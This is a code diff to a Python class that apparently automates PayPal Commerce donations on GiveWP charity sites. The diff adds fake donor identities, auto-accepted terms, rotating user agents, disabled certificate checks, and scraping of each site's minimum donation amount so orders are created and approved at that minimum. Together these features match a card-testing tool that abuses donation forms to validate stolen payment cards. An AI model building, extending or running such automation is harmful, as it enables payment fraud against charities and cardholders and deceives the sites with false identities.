@@ -113,6 +113,8 @@ class PayPalCommerce:
         self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
         self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
         self.donation = "1.00"
+        self.minimum_amount = "1.00"
+        self.currency = "USD"
         self.r = requests.Session()
         self.r.verify = False
         self.uu = UserAgent()
@@ -129,7 +131,6 @@ class PayPalCommerce:
             self.inurl += f"?{urlparse(target_url).query}"
         self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
         
-        # 6 متصفحات مختلفة
         self.user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -145,10 +146,79 @@ class PayPalCommerce:
         self._get_client_token()
     
     def get_next_ua(self):
-        """يرجع User-Agent التالي بالترتيب"""
         ua = self.user_agents[self.ua_index % len(self.user_agents)]
         self.ua_index += 1
         return ua
+
+    def get_address_data(self):
+        return {
+            'give-address1': '123 Main Street',
+            'give-address2': 'Apt 4B',
+            'give-city': 'New York City',
+            'give-state': 'NY',
+            'give-zip': '10001',
+            'give-country': 'US',
+            'give-phone': '2125551234',
+            'address1': '123 Main Street',
+            'address2': 'Apt 4B',
+            'city': 'New York City',
+            'state': 'NY',
+            'zip': '10001',
+            'country': 'US',
+            'phone': '2125551234',
+        }
+    
+    def get_terms_data(self):
+        return {
+            'give_agree_to_terms': '1',
+            'give_tos_agree': '1',
+            'give_terms_agreement': '1',
+            'give_terms': '1',
+            'agree_to_terms': '1',
+            'tos_agree': '1',
+        }
+
+    def get_base_form_data(self):
+        form_data = self.form_data.copy()
+        form_data.update({
+            'give-amount': self.minimum_amount,
+            'give-currency': self.currency,
+            'currency': self.currency,
+            'payment-mode': 'paypal-commerce',
+            'give_first': random.choice(self.first_name),
+            'give_last': random.choice(self.last_name),
+            'give_email': self.email,
+            'give-gateway': 'paypal-commerce',
+        })
+        form_data.update(self.get_address_data())
+        form_data.update(self.get_terms_data())
+        return form_data
+
+    def _extract_minimum_amount(self, html):
+        try:
+            min_matches = re.findall(r'minimum donation amount of \$([\d.]+)', html, re.IGNORECASE)
+            if min_matches:
+                self.minimum_amount = min_matches[0]
+                return
+            
+            min_matches = re.findall(r'minimum donation amount of &euro;([\d.]+)', html, re.IGNORECASE)
+            if min_matches:
+                self.minimum_amount = min_matches[0]
+                return
+            
+            min_attr = re.findall(r'data-min-amount=["\']([\d.]+)["\']', html, re.IGNORECASE)
+            if min_attr:
+                self.minimum_amount = min_attr[0]
+                return
+            
+            min_input = re.findall(r'min=["\']([\d.]+)["\']', html, re.IGNORECASE)
+            if min_input:
+                self.minimum_amount = min_input[0]
+                return
+            
+            self.minimum_amount = "1.00"
+        except:
+            self.minimum_amount = "1.00"
 
     def _init_and_extract(self):
         try:
@@ -163,6 +233,7 @@ class PayPalCommerce:
             self._extract_client_id(html)
             self._extract_form_data(html)
             self._extract_ajax_url(html)
+            self._extract_minimum_amount(html)
         except Exception as e:
             print(f"Init error: {e}")
 
@@ -283,26 +354,7 @@ class PayPalCommerce:
     def _create_order_givewp(self):
         if not self.ajax_url:
             return None
-        form_data = self.form_data.copy()
-        form_data.update({
-            'give-amount': self.donation,
-            'payment-mode': 'paypal-commerce',
-            'give_first': random.choice(self.first_name),
-            'give_last': random.choice(self.last_name),
-            'give_email': self.email,
-            'give-gateway': 'paypal-commerce',
-            'give-address1': '123 Main St',
-            'give-address2': '',
-            'give-city': 'New York',
-            'give-state': 'NY',
-            'give-zip': '10001',
-            'give-country': 'US',
-            'give-phone': '2125551234',
-            'give_agree_to_terms': '1',
-            'give_tos_agree': '1',
-            'give_terms_agreement': '1',
-            'give_terms': '1',
-        })
+        form_data = self.get_base_form_data()
         headers = {
             'user-agent': self.get_next_ua(),
             'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -349,7 +401,10 @@ class PayPalCommerce:
             data = {
                 'intent': 'CAPTURE',
                 'purchase_units': [{
-                    'amount': {'currency_code': 'USD', 'value': self.donation}
+                    'amount': {
+                        'currency_code': self.currency,
+                        'value': self.donation
+                    }
                 }],
                 'application_context': {
                     'shipping_preference': 'NO_SHIPPING',
@@ -368,26 +423,7 @@ class PayPalCommerce:
     def _approve_order(self, order_id):
         if not self.ajax_url:
             return None
-        form_data = self.form_data.copy()
-        form_data.update({
-            'give-amount': self.donation,
-            'payment-mode': 'paypal-commerce',
-            'give_first': random.choice(self.first_name),
-            'give_last': random.choice(self.last_name),
-            'give_email': self.email,
-            'give-gateway': 'paypal-commerce',
-            'give-address1': '123 Main St',
-            'give-address2': '',
-            'give-city': 'New York',
-            'give-state': 'NY',
-            'give-zip': '10001',
-            'give-country': 'US',
-            'give-phone': '2125551234',
-            'give_agree_to_terms': '1',
-            'give_tos_agree': '1',
-            'give_terms_agreement': '1',
-            'give_terms': '1',
-        })
+        form_data = self.get_base_form_data()
         headers = {
             'user-agent': self.get_next_ua(),
             'accept': 'application/json, text/javascript, */*; q=0.01',
